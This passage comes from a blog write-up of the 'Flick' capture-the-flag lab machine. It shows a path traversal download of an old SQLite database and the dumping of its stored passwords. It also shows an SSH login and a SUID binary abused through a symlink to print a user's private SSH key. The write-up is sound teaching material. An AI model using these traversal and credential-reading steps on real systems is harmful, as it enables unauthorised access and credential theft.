</span><span class='line'>          <span class="s1">&#39;host&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;forge&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;forge&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;charset&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;prefix&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;schema&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;public&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;sqlsrv&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;driver&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;sqlsrv&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;host&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;database&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;prefix&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | Migration Repository Table</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | This table keeps track of all the migrations that have already run for</span>
</span><span class='line'><span class="cm"> | your application. Using this information, we can determine which of</span>
</span><span class='line'><span class="cm"> | the migrations on disk haven&#39;t actually been run in the database.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="s1">&#39;migrations&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;migrations&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | Redis Databases</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | Redis is an open source, fast, and advanced key-value store that also</span>
</span><span class='line'><span class="cm"> | provides a richer set of commands than a typical key-value systems</span>
</span><span class='line'><span class="cm"> | such as APC or Memcached. Laravel makes it easy to dig right in.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="s1">&#39;redis&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;cluster&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;host&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;port&#39;</span>     <span class="o">=&gt;</span> <span class="mi">6379</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">),</span>
</span><span class='line'>
</span><span class='line'><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This line is what we need to be focusing on</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">database</span><span class="s1">&#39; =&gt; __DIR__.&#39;</span><span class="o">/../</span><span class="nx">database</span><span class="o">/</span><span class="nx">production</span><span class="o">.</span><span class="nx">sqlite</span><span class="err">&#39;</span><span class="p">,</span> <span class="c1">// OLD DATABASE NO LONGER IN USE!</span>
</span></code></pre></td></tr></table></div></figure>


<p>which would indicate that the app previously used SQLite, and switched to MySQL. There&rsquo;s a file I need to get my hands on !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//var/www/flick_photos/app/database/production.sqlite
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_004.png" alt="flick_004" /></a></p>

<p>Yes !  Once I renamed the file and installed SQLite tools onto my Kali VM, I was able to wander around the database to get some username and password combos</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# mv image.jpg production.sqlite
</span><span class='line'>root@pwk:~# apt-get install sqlite
</span><span class='line'>Blah blah, install blah.
</span><span class='line'>root@pwk:~# sqlite production.sqlite
</span><span class='line'>SQLite version 2.8.17
</span><span class='line'>Enter <span class="s2">&quot;.help&quot;</span> <span class="k">for</span> instructions
</span><span class='line'>sqlite&gt; .databases
</span><span class='line'>seq  name             file
</span><span class='line'>---  ---------------  ----------------------------------------------------------
</span><span class='line'><span class="m">0</span>    main             /root/Downloads/production.sqlite
</span><span class='line'><span class="m">1</span>    temp             /var/tmp/sqlite_pUdaqDiGqjXzPPF
</span><span class='line'>sqlite&gt; .tables
</span><span class='line'>old_users
</span><span class='line'>sqlite&gt; .dump old_users
</span><span class='line'>BEGIN TRANSACTION<span class="p">;</span>
</span><span class='line'>CREATE TABLE old_users <span class="o">(</span>
</span><span class='line'>  username text,
</span><span class='line'>  password text
</span><span class='line'><span class="o">)</span><span class="p">;</span>
</span><span class='line'>INSERT INTO old_users VALUES<span class="o">(</span><span class="s1">&#39;paul&#39;</span>,<span class="s1">&#39;nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>INSERT INTO old_users VALUES<span class="o">(</span><span class="s1">&#39;robin&#39;</span>,<span class="s1">&#39;JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>INSERT INTO old_users VALUES<span class="o">(</span><span class="s1">&#39;james&#39;</span>,<span class="s1">&#39;scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>INSERT INTO old_users VALUES<span class="o">(</span><span class="s1">&#39;dean&#39;</span>,<span class="s1">&#39;FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>COMMIT<span class="p">;</span>
</span><span class='line'>sqlite&gt;
</span></code></pre></td></tr></table></div></figure>


<p>I know that the users Robin and Dean exist, so I decided to try the above passwords</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh robin@192.168.0.106
</span><span class='line'>
</span><span class='line'> .o88o. oooo   o8o            oooo
</span><span class='line'> <span class="m">888</span> <span class="sb">`</span><span class="s2">&quot; `888   `&quot;</span><span class="s1">&#39;            `888</span>
</span><span class='line'><span class="s1">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s1"> 888     888  `888  d88&#39;</span> <span class="sb">`</span><span class="s2">&quot;Y8  888 .8P&#39;</span>
</span><span class='line'><span class="s2"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s2"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s2">o888o   o888o o888o `Y8bod8P&#39; o888o o888o </span>
</span><span class='line'>
</span><span class='line'><span class="s2">robin@192.168.0.106&#39;s password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1</span>
</span><span class='line'><span class="s2">Permission denied, please try again.</span>
</span><span class='line'><span class="s2">robin@192.168.0.106&#39;s password: ^C</span>
</span><span class='line'><span class="s2">root@pwk:~# ssh dean@192.168.0.106</span>
</span><span class='line'>
</span><span class='line'><span class="s2"> .o88o. oooo   o8o            oooo</span>
</span><span class='line'><span class="s2"> 888 `&quot;</span> <span class="sb">`</span><span class="m">888</span>   <span class="sb">`</span><span class="s2">&quot;&#39;            `888</span>
</span><span class='line'><span class="s2">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s2"> 888     888  `888  d88&#39; `&quot;</span>Y8  <span class="m">888</span> .8P<span class="s1">&#39;</span>
</span><span class='line'><span class="s1"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s1"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s1">o888o   o888o o888o `Y8bod8P&#39;</span> o888o o888o
</span><span class='line'>
</span><span class='line'>dean@192.168.0.106<span class="s1">&#39;s password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA</span>
</span><span class='line'><span class="s1">Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</span>
</span><span class='line'>
</span><span class='line'><span class="s1"> * Documentation:  https://help.ubuntu.com/</span>
</span><span class='line'>
</span><span class='line'><span class="s1">  System information as of Wed Aug 13 00:18:03 SAST 2014</span>
</span><span class='line'>
</span><span class='line'><span class="s1">  System load:  0.0               Processes:              87</span>
</span><span class='line'><span class="s1">  Usage of /:   39.7% of 6.99GB   Users logged in:        0</span>
</span><span class='line'><span class="s1">  Memory usage: 49%               IP address for eth0:    192.168.0.106</span>
</span><span class='line'><span class="s1">  Swap usage:   1%                IP address for docker0: 172.17.42.1</span>
</span><span class='line'>
</span><span class='line'><span class="s1">  Graph this data and manage this system at:</span>
</span><span class='line'><span class="s1">    https://landscape.canonical.com/</span>
</span><span class='line'>
</span><span class='line'><span class="s1">79 packages can be updated.</span>
</span><span class='line'><span class="s1">51 updates are security updates.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">New release &#39;</span>14.04.1 LTS<span class="s1">&#39; available.</span>
</span><span class='line'><span class="s1">Run &#39;</span><span class="k">do</span>-release-upgrade<span class="err">&#39;</span> to upgrade to it.
</span><span class='line'>
</span><span class='line'>Last login: Wed Aug <span class="m">13</span> 00:16:41 <span class="m">2014</span> from 192.168.0.110
</span><span class='line'>dean@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>OK, we&rsquo;re in. Let the fun continue.</p>

<hr />

<h2>Dean Covers While Robin&rsquo;s on Holiday</h2>

<p>Dean&rsquo;s home folder includes two files - a message text file and a binary called read_docker with the SUID bit set as the robin user.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dean@flick:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 16
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root  root  <span class="m">1250</span> Aug  <span class="m">4</span> 12:56 message.txt
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> robin robin <span class="m">8987</span> Aug  <span class="m">4</span> 14:45 read_docker
</span><span class='line'>dean@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>The message file tells us that Robin is away on holiday, and that the admin guys will allow Dean access to his dockerfile in his home directory.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>-----BEGIN PGP SIGNED MESSAGE-----
</span><span class='line'>Hash: SHA1
</span><span class='line'>
</span><span class='line'>Hi Dean,
</span><span class='line'>
</span><span class='line'>I will be away on leave for the next few weeks. I have asked the admin guys to
</span><span class='line'>write a quick script that will allow you to read my .dockerfile for flick-
</span><span class='line'>a-photo so that you can continue working in my absense.
</span><span class='line'>
</span><span class='line'>The .dockerfile is in my home, so the path for the script will be something like
</span><span class='line'>/home/robin/flick-dev/
</span><span class='line'>
</span><span class='line'>Please call me if you have any troubles!
</span><span class='line'>
</span><span class='line'>- --
</span><span class='line'>Ciao
</span><span class='line'>Robin
</span><span class='line'>-----BEGIN PGP SIGNATURE-----
</span><span class='line'>Version: GnuPG v1
</span><span class='line'>
</span><span class='line'>iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
</span><span class='line'>yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
</span><span class='line'>ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
</span><span class='line'>enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
</span><span class='line'>9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
</span><span class='line'>jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
</span><span class='line'>AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
</span><span class='line'>0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
</span><span class='line'>lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
</span><span class='line'>q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
</span><span class='line'>Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
</span><span class='line'>nZAuFXkGFu6cMMD4rDXQ
</span><span class='line'>=2moZ
</span><span class='line'>-----END PGP SIGNATURE-----
</span></code></pre></td></tr></table></div></figure>


<p>Looks like they tried to be clever and made the binary instead. So, what does this binary do ? It seems to just read any file called &ldquo;dockerfile&rdquo; from the directory you provide.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dean@flick:~<span class="nv">$ </span>./read_docker /home/robin
</span><span class='line'>ERROR: the specified docker file doesn<span class="err">&#39;</span>t exist: /home/robin/Dockerfile
</span><span class='line'>Usage is: ./read_docker /path/to/dockerfile
</span><span class='line'>dean@flick:~<span class="nv">$ </span>./read_docker /home/robin/flick-dev
</span><span class='line'><span class="c"># Flick-a-photo dev env</span>
</span><span class='line'>RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli <span class="o">&amp;&amp;</span> apt-get clean <span class="o">&amp;&amp;</span> rm -rf /var/lib/apt/lists/*
</span><span class='line'>
</span><span class='line'>CMD <span class="o">[</span><span class="s2">&quot;/usr/sbin/apache2&quot;</span>, <span class="s2">&quot;-D&quot;</span>, <span class="s2">&quot;FOREGROUND&quot;</span><span class="o">]</span>
</span><span class='line'>dean@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>After messing around reading files I created in varying directories, I decided to fool the application into reading a symlink to an arbitrary file on the filesystem - my first attempt was /home/robin/.ssh/id_rsa. Might as well start somewhere, right ? I was fully expecting this to fail, as I had no idea if the target file actually existed.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dean@flick:~<span class="nv">$ </span>ln -s /home/robin/.ssh/id_rsa /home/dean/Dockerfile
</span><span class='line'>dean@flick:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 16
</span><span class='line'>lrwxrwxrwx <span class="m">1</span> dean  dean    <span class="m">23</span> Aug <span class="m">11</span> 23:10 Dockerfile -&gt; /home/robin/.ssh/id_rsa
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root  root  <span class="m">1250</span> Aug  <span class="m">4</span> 12:56 message.txt
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> robin robin <span class="m">8987</span> Aug  <span class="m">4</span> 14:45 read_docker
</span><span class='line'>dean@flick:~<span class="nv">$ </span>./read_docker ./
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
</span><span class='line'>ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
</span><span class='line'>FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
</span><span class='line'>S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
</span><span class='line'>CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
</span><span class='line'>d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
</span><span class='line'>jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
</span><span class='line'>wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
</span><span class='line'>tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
</span><span class='line'>Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
</span><span class='line'>wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
</span><span class='line'>mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
</span><span class='line'>l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
</span><span class='line'>JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
</span><span class='line'>gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
</span><span class='line'>JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
</span><span class='line'>rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
</span><span class='line'>PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
</span><span class='line'>zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
</span><span class='line'>AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
</span><span class='line'>EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
</span><span class='line'>mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
</span><span class='line'>JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
</span><span class='line'>Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
</span><span class='line'>VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span><span class='line'>dean@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://cdn.gifbay.com/2012/10/what_the_hell_just_happened-7962.gif" alt="" /></p>

<p>OK, so, I&rsquo;ll put that into a file then and log in as Robin.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dean@flick:~<span class="nv">$ </span>./read_docker ./ &gt; robin.priv
</span><span class='line'>dean@flick:~<span class="nv">$ </span>chmod <span class="m">600</span> ./robin.priv
</span><span class='line'>dean@flick:~<span class="nv">$ </span>ssh -i robin.priv robin@127.0.0.1
</span><span class='line'>
</span><span class='line'> .o88o. oooo   o8o            oooo
</span><span class='line'> <span class="m">888</span> <span class="sb">`</span><span class="s2">&quot; `888   `&quot;</span><span class="s1">&#39;            `888</span>
</span><span class='line'><span class="s1">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s1"> 888     888  `888  d88&#39;</span> <span class="sb">`</span><span class="err">&quot;</span>Y8  <span class="m">888</span> .8P<span class="s1">&#39;</span>
</span><span class='line'><span class="s1"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s1"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s1">o888o   o888o o888o `Y8bod8P&#39;</span> o888o o888o
</span><span class='line'>
</span><span class='line'>Welcome to Ubuntu 12.04.4 LTS <span class="o">(</span>GNU/Linux 3.11.0-15-generic x86_64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>  System information as of Wed Aug <span class="m">13</span> 00:31:14 SAST 2014
</span><span class='line'>
</span><span class='line'>  System load:  0.0               Processes:              91
</span><span class='line'>  Usage of /:   39.7% of 6.99GB   Users logged in:        1
</span><span class='line'>  Memory usage: 51%               IP address <span class="k">for</span> eth0:    192.168.0.106
</span><span class='line'>  Swap usage:   1%                IP address <span class="k">for</span> docker0: 172.17.42.1
</span><span class='line'>
</span><span class='line'>  Graph this data and manage this system at:
</span><span class='line'>    https://landscape.canonical.com/
</span><span class='line'>
</span><span class='line'><span class="m">79</span> packages can be updated.
</span><span class='line'><span class="m">51</span> updates are security updates.
</span><span class='line'>
</span><span class='line'>New release <span class="s1">&#39;14.04.1 LTS&#39;</span> available.
</span><span class='line'>Run <span class="s1">&#39;do-release-upgrade&#39;</span> to upgrade to it.
</span><span class='line'>
</span><span class='line'>Last login: Wed Aug <span class="m">13</span> 00:16:47 <span class="m">2014</span> from 192.168.0.110
</span><span class='line'>robin@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<hr />

<h2>Docker all the Things !</h2>

<p>Robin can sudo /opt/start_apache/restart.sh without a password, as shown by running sudo -l</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
